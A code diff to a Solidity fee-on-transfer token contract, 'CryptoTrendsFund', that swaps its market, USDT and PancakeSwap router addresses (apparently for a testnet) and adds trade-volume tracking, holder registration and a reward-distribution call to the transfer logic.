@@ -365,10 +365,10 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
     uint private _totalSupply;
     string private _name;
     string private _symbol;
-    address public marketAddress = 0x5e1d487af466d4dD78a46E359d99c5a0d583FD83;
+    address public marketAddress = 0xd3c0b6Aa1538d639912789be705F18b5Fd89fcE6;
     IPancakeSwapV2Router02 public immutable uniswapV2Router;
     address public uniswapV2Pair;
-    address public usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
+    address public usdtAddress = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
     bool inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = true;
     mapping (address => bool) public isExcludeds;
@@ -390,8 +390,8 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
         
         // uni 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
         // pancake 0x10ED43C718714eb63d5aA57B78B54704E256024E
-        // pancake Testnet 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
-        IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        // pancake Testnet 0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F
+        IPancakeSwapV2Router02 _uniswapV2Router = IPancakeSwapV2Router02(0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F);
         uniswapV2Pair = IPancakeSwapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), usdtAddress);
         uniswapV2Router = _uniswapV2Router;
@@ -475,6 +475,10 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
         marketAddress = to;
     }
 
+    function getUsdtAmountOut(uint256 amount) public returns (uint256){
+        return amount;
+    }
+
     function _transfer(
         address sender,
         address recipient,
@@ -486,6 +490,13 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
         require(senderBalance >= amount, "CTF: transfer amount exceeds balance");
         uint _amount = amount;
 
+        if(DEXs[sender]) {
+            tradeVolume[recipient] += getUsdtAmountOut(_amount);
+        } 
+
+        if(DEXs[recipient]) {
+            tradeVolume[sender] += getUsdtAmountOut(_amount);
+        }
         
         if ((( DEXs[sender] && recipient != address(uniswapV2Router)) || DEXs[recipient]) &&
             !inSwapAndLiquify &&
@@ -511,11 +522,17 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
                 recipient != address(this)
             ) {
                 swapTokensForUsdt(contractTokenBalance);
-                
-            }
+
+                if(sender != address(this)) {
+                    addHolder(sender);
+                }
+
+                processReward(500000);
+            }            
+        }
 
             _amount = amount * 985 / 1000;
-        }
+ 
 
         unchecked {
             _balances[sender] = senderBalance - amount;
@@ -620,13 +637,13 @@ contract CryptoTrendsFund is Context, IERC20, IERC20Metadata, Ownable{
             return;
         }
 
-        IERC20 USDT = IERC20(_usdt);
+        IERC20 USDT = IERC20(usdtAddress);
 
         uint256 balance = USDT.balanceOf(address(this));
         if (balance < holderRewardCondition) {
             return;
         }
-        IERC20 holdToken = IERC20(_mainPair);
+        IERC20 holdToken = IERC20(address(uniswapV2Pair));
         uint holdTokenTotal = holdToken.totalSupply();
 
         address shareHolder;
